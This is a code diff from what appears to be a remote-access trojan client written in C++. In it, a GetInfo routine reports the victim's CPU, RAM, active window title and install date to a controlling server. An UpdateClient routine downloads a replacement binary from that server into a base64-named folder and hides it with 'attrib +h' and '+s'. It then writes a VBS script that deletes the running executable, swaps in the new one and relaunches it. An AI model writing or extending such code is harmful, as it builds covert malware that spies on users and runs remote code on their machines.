@@ -53,6 +53,9 @@ bool GetInfo(SOCKET Sock)
     SystemUtils su;
     DirUtils du;
 	WindowUtils wu;
+	Settaggi sett;
+
+	sett.GetSettingsFromReg();
 
 	json j;
 
@@ -60,7 +63,7 @@ bool GetInfo(SOCKET Sock)
     j["CPU"] = to_string((int)su.GetCPUload()) + "%";
     j["RAM"] = to_string((int)su.GetRAMperc()) + "%";
 	j["ACTWIN"] = wu.GetWindowTitle();
-	j["INSTDATE"] = "TODO";
+	j["INSTDATE"] = sett.InstallDate;
 
 	return COMUNICAZIONI::GetInfo(Sock, j.dump());
 }
@@ -77,17 +80,23 @@ bool UpdateClient(SOCKET Sock)
 	DirUtils du;
 	SystemUtils su;
 	RegUtils ru;
+	COMUNICAZIONI::NewClient NewClient;
 
-	string NewClient = COMUNICAZIONI::UpdateClient(Sock);
+	NewClient = COMUNICAZIONI::UpdateClient(Sock);
 
-	if (NewClient == "")
+	if (NewClient.j.dump() == "null")
 		return false;
 
 	if (!du.CheckDir(du.GetModuleFilePath() + "VXBkYXRl"))
 		du.MakeDir(du.GetModuleFilePath() + "VXBkYXRl");
 
-	if (!du.WriteBinaryFile(du.GetModuleFilePath() + "VXBkYXRl\\" + du.GetModuleFile(), NewClient))
+	if (!du.WriteBinaryFile(du.GetModuleFilePath() + "VXBkYXRl\\" + du.GetModuleFile(), NewClient.Str))
 		return false;
+
+	if (NewClient.j["Attrib"]["Hidden"])
+		su.NoOutputCMD("attrib +h \"" + du.GetModuleFilePath() + "VXBkYXRl\\" + du.GetModuleFile() + "\"");
+	if (NewClient.j["Attrib"]["System"])
+		su.NoOutputCMD("attrib +s \"" + du.GetModuleFilePath() + "VXBkYXRl\\" + du.GetModuleFile() + "\"");
 
 	if (!du.WriteFile(du.GetModuleFilePath() + "Update.vbs", "WScript.Sleep 5000\nSet filesys = CreateObject(\"Scripting.FileSystemObject\")\nSet WshShell = WScript.CreateObject(\"WScript.Shell\")\nfilesys.DeleteFile \"" + du.GetFullModuleFilePath() + "\"\nfilesys.MoveFile \"" + du.GetModuleFilePath() + "VXBkYXRl\\" + du.GetModuleFile() + "\", \"" + du.GetFullModuleFilePath() + "\"\nWScript.Sleep 1000\nWshShell.Run \"" + du.GetFullModuleFilePath() + "\", 1, false\nfilesys.DeleteFolder \"" + du.GetModuleFilePath() + "VXBkYXRl\"\nfilesys.DeleteFile \"" + du.GetModuleFilePath() + "Update.vbs\""))
 		return false;
